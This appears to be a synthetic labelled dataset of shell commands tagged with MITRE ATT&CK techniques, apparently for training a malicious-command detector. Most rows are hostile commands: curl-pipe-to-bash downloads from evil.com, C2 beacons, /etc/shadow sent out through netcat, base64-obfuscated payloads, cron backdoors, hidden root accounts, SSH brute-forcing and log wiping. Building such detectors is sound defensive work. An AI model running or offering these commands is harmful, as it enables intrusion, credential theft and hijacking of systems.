find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
sudo cat /etc/resolv.conf,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
sudo nmap -A -T4 192.168.1.0/24,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'Y2F0IC90bXAvZW5jb2RlZCB8IHh4ZCAtciAtcCB8IGJhc2g=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'Y2F0IC9ldGMvcGFzc3dkIHwgYXdrIC1GOiAnJDMgPj0gMTAwMCc=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'd21pZXhlYy5weSBkb21haW4vYWRtaW46cGFzc0AxMC4wLjAuNSA7IGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'bmMgLWUgL2Jpbi9iYXNoIGF0dGFja2VyLmNvbSA4MCB8IHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1496_Resource_Hijacking'],synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
curl -s http://c2.attacker.com/beacon,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 ; history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Z2V0ZW50IHBhc3N3ZCB8IGF3ayAtRjogJyQzID49IDEwMDAn' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
tar -czf backup.tar.gz /home/user,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
nohup medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh &,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 0, 0]",['T1110_Brute_Force'],synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe ; history -c,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0.0, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find  /  -writable  -type  d  2>/dev/null  &&  >  /dev/null  2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
wget http://attacker.com/payload -O /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo 'Li9kaXJ0eWNvdyAvZXRjL3Bhc3N3ZCAncm9vdDo6MDowOnJvb3Q6L3Jvb3Q6L2Jpbi9iYXNoJyB8ID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
openssl rand -hex 16,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
time rm -rf /tmp/* /var/tmp/* ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Y2F0IC9wcm9jL3ZlcnNpb24=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
sha256sum /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
echo 'c2NwIGF0dGFja2VyQDEwLjAuMC45OTovdG9vbHMvbGlucGVhcy5zaCAvdG1wLyB8IGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
nohup nmap --script=vuln 10.0.0.1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1 | history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap -A -T4 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""dmesg | head -20""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1082_System_Information_Discovery'],synthetic
time $env:cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'Z2NjIGV4cGxvaXQuYyAtbyBleHBsb2l0ICYmIC4vZXhwbG9pdA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo echo 'bmMgLXp2IDEwLjAuMC4xIDEtMTAwMCAyPiYxIHwgZ3JlcCBzdWNjZWVkZWQ=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
lsb_release  -a  |  sleep  1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cG93ZXJzaGVsbC5leGUgLUVuY29kZWRDb21tYW5kIEpBQnpBLi4uIHwgY2htb2QgK3ggL3RtcC9wYXlsb2Fk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.6, 0, 0]",['T1110_Brute_Force'],synthetic
hostnamectl,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
nohup usermod -aG sudo compromised_user ; echo done &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"nohup php -r '$sock=fsockopen(""10.0.0.99"",4444); ...' &","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
useradd -m -s /bin/bash -G sudo newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
sudo curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1496_Resource_Hijacking'],synthetic
time route -n && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
traceroute google.com,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
find / -perm -4000 -type f 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1 && echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
crontab -e ; echo done,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
Get-LocalGroupMember -Group Administrators ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'c2ggLWMgJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaCc=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo -u www-data bash && history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo cat /etc/passwd | grep -v nologin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
sudo ln -s /tmp/backdoor.sh /etc/cron.d/system-update,"[0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1053_Scheduled_Task'],synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
"runuser  -l  postgres  -c  'psql  -c  ""SELECT  pg_read_file(\'/etc/passwd\')""'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo 'bG9jYXRlIHdwLWNvbmZpZy5waHA=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
grep -r 'error' /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
perl -e 'use Socket; ...',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
id -u,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
nohup wget -q -O- --header='X-Auth: token123' http://evil.com/cmd ; > /dev/null 2>&1 &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.48, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ip link show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
systemctl enable --now malicious.service,"[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
> ~/.bash_history && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]",['T1070_Indicator_Removal'],synthetic
echo 'bmV0IHVzZXIgL2RvbWFpbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' && > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.48, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'bG9jYXRlIHdwLWNvbmZpZy5waHA=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
ip link show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
sudo useradd -m -s /bin/bash -G sudo newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1098_Account_Manipulation'],synthetic
time (crontab -l; echo '* * * * * /tmp/payload.sh') | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.52, 1, 0]",['T1053_Scheduled_Task'],synthetic
ps aux | grep nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.2, 1, 0]",['BENIGN'],synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo 'R2V0LUxvY2FsR3JvdXBNZW1iZXIgLUdyb3VwIEFkbWluaXN0cmF0b3JzICYmIHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
useradd  -o  -u  0  -g  0  -M  -d  /root  -s  /bin/bash  ghost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1136_Create_Account'],synthetic
for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
"bash -c ""echo 'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlcg==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
time find / -perm -4000 -type f 2>/dev/null && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
openssl rand -hex 16,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
nohup cat /etc/passwd | awk -F: '$3 >= 1000' &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1087_Account_Discovery'],synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
curl  -A  'Mozilla/5.0'  http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
echo 'bmMgLXp2IDEwLjAuMC4xIDEtMTAwMCAyPiYxIHwgZ3JlcCBzdWNjZWVkZWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
fping -a -g 192.168.1.0/24 2>/dev/null,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
for  p  in  $(cat  passwords.txt);  do  sshpass  -p  $p  ssh  root@10.0.0.1  id;  done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
"bash -c ""./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
nbtscan  192.168.1.0/24  |  sleep  1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
ssh admin@localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1078_Valid_Accounts'],synthetic
usermod  -aG  sudo  compromised_user  ;  history  -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'd21pYyB1c2VyYWNjb3VudCBsaXN0' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'ZWNobyAnY29tcHJvbWlzZWQgQUxMPShBTEwpIE5PUEFTU1dEOkFMTCcgPj4gL2V0Yy9zdWRvZXJz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAtdiBub2xvZ2luIHwgZ3JlcCAtdiBmYWxzZQ=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
sudo locate wp-config.php && chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'dXNlcm1vZCAtYUcgc3VkbyBjb21wcm9taXNlZF91c2Vy' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
net user /domain && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3  -c  ""import  os;  os.system('id')""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"bash -c ""echo 'aXAgbGluayBzaG93ICYmIGVjaG8gZG9uZQ==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
time adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1136_Create_Account'],synthetic
sudo fping -a -g 192.168.1.0/24 2>/dev/null,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
id -u,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
echo  'Y3VybCAtQSAnTW96aWxsYS81LjAnIGh0dHA6Ly9jMi5hdHRhY2tlci5jb20vY2hlY2staW4='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.6, 0, 0]",['T1110_Brute_Force'],synthetic
cat  /etc/passwd  |  grep  -v  nologin  |  grep  -v  false,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.4, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
locate  wp-config.php  &&  echo  done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"time python3 -c 'import socket,subprocess,os;...'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo  'Y2F0IC9ldGMvc2hhZG93IHwgbmMgMTAuMC4wLjk5IDQ0NDQ='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
